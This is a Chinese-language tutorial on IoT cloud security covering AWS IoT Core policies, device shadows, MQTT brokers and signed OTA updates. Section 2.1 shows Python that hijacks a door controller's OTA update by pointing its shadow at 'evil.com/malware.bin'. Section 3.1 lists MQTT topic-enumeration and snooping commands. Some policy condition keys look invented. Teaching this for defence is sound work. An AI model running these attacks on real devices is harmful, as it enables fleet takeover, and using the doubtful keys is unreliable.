# IoT 云端安全

## 概述

IoT 设备的价值不仅在于硬件本身，更在于云端数据和服务。IoT 云平台承载设备管理、数据存储、固件 OTA 更新、AI 分析等核心功能。其安全直接关系到数百万设备的命运。

---

## 1. IoT 云架构安全模型

### 1.1 AWS IoT Core 安全架构

```
┌──────────────────────────────────────────┐
│               IoT 设备层                  │
│  ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐       │
│  │传感器│ │摄像头│ │网关 │ │PLC  │       │
│  └──┬──┘ └──┬──┘ └──┬──┘ └──┬──┘       │
│     │TLS1.2 │ mTLS  │ mTLS  │ mTLS     │
├─────┴───────┴───────┴───────┴───────────┤
│           IoT Core 消息代理              │
│  ┌──────────────────────────────────┐   │
│  │  设备认证 → 授权策略 → 规则引擎   │   │
│  └──────────────────────────────────┘   │
├─────────────────────────────────────────┤
│              后端服务层                   │
│  ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐  │
│  │Lambda│ │Dynamo│ │S3   │ │API GW│  │
│  └──────┘ └──────┘ └──────┘ └──────┘  │
└─────────────────────────────────────────┘
```

### 1.2 IoT 设备认证策略

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iot:Connect",
      "Resource": "arn:aws:iot:us-east-1:123456789:client/${iot:ClientId}",
      "Condition": {
        "Bool": {
          "iot:Connection.Thing.IsAttached": "true"
        }
      }
    },
    {
      "Effect": "Allow",
      "Action": "iot:Publish",
      "Resource": "arn:aws:iot:us-east-1:123456789:topic/device/${iot:Connection.Thing.ThingName}/*",
      "Condition": {
        "NumericLessThan": {
          "iot:PublishThrottle": 100
        }
      }
    },
    {
      "Effect": "Allow",
      "Action": "iot:Subscribe",
      "Resource": "arn:aws:iot:us-east-1:123456789:topicfilter/cmd/${iot:Connection.Thing.ThingName}/*"
    },
    {
      "Effect": "Deny",
      "Action": "iot:Subscribe",
      "Resource": "arn:aws:iot:us-east-1:123456789:topicfilter/device/+/*",
      "Condition": {
        "StringNotEquals": {
          "iot:Connection.Thing.ThingName": "${iot:ClientId}"
        }
      }
    }
  ]
}
```

**策略关键点**：
- 设备只能发布到自己的 topic（`device/{thingName}/*`）
- 设备只能订阅给自己的命令（`cmd/{thingName}/*`）
- 通过 `iot:ClientId` 变量绑定设备身份，防止越权
- 速率限制防止 DoS（`PublishThrottle < 100`）

---

## 2. 设备影子安全

### 2.1 影子服务攻击面

```python
# 攻击场景：未授权修改设备影子
import boto3

def exploit_shadow_access():
    iot = boto3.client('iot-data')

    # ❌ 如果 IAM 策略过于宽松，可修改任意设备影子
    payload = {
        "state": {
            "desired": {
                "firmware_url": "http://evil.com/malware.bin",
                "update_flag": True
            }
        }
    }

    # 劫持 OTA 更新
    iot.update_thing_shadow(
        thingName='building-door-controller',
        payload=json.dumps(payload)
    )
```

### 2.2 安全配置

```terraform
# IoT Device Shadow 安全策略
resource "aws_iot_policy" "device_shadow" {
  name = "DeviceShadowPolicy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "iot:GetThingShadow",
          "iot:UpdateThingShadow"
        ]
        Resource = [
          "arn:aws:iot:*:*:thing/$${iot:Connection.Thing.ThingName}"
        ]
        Condition = {
          Bool = {
            # 仅允许已注册的设备访问自己的影子
            "iot:Connection.Thing.IsAttached": "true"
          }
        }
      },
      {
        Effect = "Deny"
        Action = "iot:UpdateThingShadow"
        Resource = "*"
        Condition = {
          # 拒绝 OTA 相关字段的非法写入
          "StringLike": {
            "iot:ThingShadowPayload": "*firmware_url*"
          }
        }
      }
    ]
  })
}
```

---

## 3. MQTT Broker 安全

### 3.1 常见 MQTT 攻击

```bash
# 1. MQTT Topic 枚举
mosquitto_sub -h broker.iot.com -p 8883 \
  --cafile ca.crt --cert device.crt --key device.key \
  -t "#" -v  # # 通配符订阅所有 topic

# 2. Retained Message 信息泄露
# 攻击者订阅后可能获得设备上次发布的敏感数据
mosquitto_sub -h broker.iot.com -t "device/+/status" -v

# 3. MQTT 中间人攻击
# 如果没有验证服务器证书
mosquitto_sub -h evil-broker.com -t "device/thermostat/cmd" -v
```

### 3.2 MQTT 安全配置

```python
import paho.mqtt.client as mqtt
import ssl

def secure_mqtt_client(device_id, ca_cert, client_cert, client_key):
    client = mqtt.Client(
        client_id=device_id,
        protocol=mqtt.MQTTv311,
        clean_session=True
    )

    # TLS 配置
    client.tls_set(
        ca_certs=ca_cert,
        certfile=client_cert,
        keyfile=client_key,
        cert_reqs=ssl.CERT_REQUIRED,  # 要求服务器证书
        tls_version=ssl.PROTOCOL_TLSv1_2,
        ciphers=None
    )

    # 设置认证
    client.username_pw_set(
        username=device_id,
        password=None  # X.509 证书认证不需要密码
    )

    # 连接
    client.connect(
        host='broker.iot.example.com',
        port=8883,
        keepalive=60
    )

    # 回调
    client.on_message = on_message_received
    client.on_connect = on_connect

    return client

def on_message_received(client, userdata, msg):
    # ✅ 验证消息来源和内容
    if not validate_topic_source(msg.topic, client._client_id):
        logging.warning(f"Unauthorized topic: {msg.topic}")
        return

    # 防止命令注入
    if b';' in msg.payload or b'&&' in msg.payload:
        logging.warning(f"Potential command injection in payload")
        return

    process_message(msg.payload)
```

---

## 4. 固件 OTA 安全

### 4.1 安全 OTA 管道

```yaml
OTA 安全更新流程:
  1. 固件签名:
     - 开发者签名固件 (ECDSA P-256)
     - 签名存储在固件头部

  2. 安全传输:
     - HTTPS/TLS 下载固件
     - 校验 SHA256 哈希

  3. 签名验证:
     - 引导加载程序验证签名
     - 验证签名时间戳 (防重放攻击)
     - 检查固件版本号 (防回滚)

  4. 安全启动:
     - 验证引导加载程序签名
     - 验证内核签名
     - 验证应用程序签名
     - 任何验证失败 → 回退到上一个已知良好固件
```

### 4.2 AWS IoT Jobs 安全配置

```python
import boto3

def secure_ota_job(thing_group, firmware_url, signing_key):
    iot = boto3.client('iot')
    s3 = boto3.client('s3')

    # 获取预签名 URL (15 分钟有效期)
    presigned_url = s3.generate_presigned_url(
        'get_object',
        Params={'Bucket': 'firmware-bucket', 'Key': firmware_url},
        ExpiresIn=900  # 15 分钟
    )

    # 创建 OTA 任务
    response = iot.create_job(
        jobId=f'ota-{datetime.now().strftime("%Y%m%d%H%M")}',
        targets=[thing_group],
        document={
            'operation': 'firmware_update',
            'firmware_url': presigned_url,
            'sha256': calculate_sha256(firmware_url),
            'signature': sign_firmware(firmware_url, signing_key),
            'min_version': '2.0.0',
            'force_update': False
        },
        timeoutConfig={
            'inProgressTimeoutInMinutes': 120
        },
        abortConfig={
            'criteriaList': [
                {
                    'failureType': 'FAILED',
                    'action': 'CANCEL',
                    'thresholdPercentage': 5,  # 5% 失败就中止
                    'minNumberOfExecutedThings': 10
                }
            ]
        }
    )
```

---

## 5. IoT 云安全清单

```yaml
IoT 云安全基线:
  设备身份:
    - [ ] 每设备唯一的 X.509 证书
    - [ ] 证书自动轮换 (AWS IoT: 7 年有效期)
    - [ ] 吊销列表实时更新 (CRL/OCSP)
    - [ ] 禁止共享证书

  MQTT 安全:
    - [ ] TLS 1.2+ 强制加密
    - [ ] 服务端证书验证
    - [ ] Topic 命名规范 (device/thingName/eventType)
    - [ ] 基于证书属性的授权策略
    - [ ] 消息大小限制 (128KB)

  数据安全:
    - [ ] 设备数据加密存储 (at rest)
    - [ ] 传输加密 (in transit)
    - [ ] 敏感数据脱敏
    - [ ] 数据保留策略 (自动过期)

  API 安全:
    - [ ] IoT Core API 使用 IAM 角色限制
    - [ ] API Gateway 限流 (1000 req/s)
    - [ ] WebSocket 长连接认证
    - [ ] 影子更新审计日志

  监控告警:
    - [ ] 异常连接率告警
    - [ ] 未授权 Topic 发布告警
    - [ ] 证书即将过期告警 (提前 30 天)
    - [ ] OTA 失败率告警
```

---

## 参考资源

- [AWS IoT Security Best Practices](https://docs.aws.amazon.com/iot/latest/developerguide/security.html)
- [Azure IoT Hub Security](https://docs.microsoft.com/azure/iot-hub/iot-hub-security-ground-up)
- [OWASP IoT Top 10](https://owasp.org/www-project-internet-of-things/)

---

*上一篇：[ZigBee/BLE/MQTT 协议安全](./03-iot-protocol-security.md)*

*下一篇：[IoT 安全测试实战](05-iot-security-testing.md)*
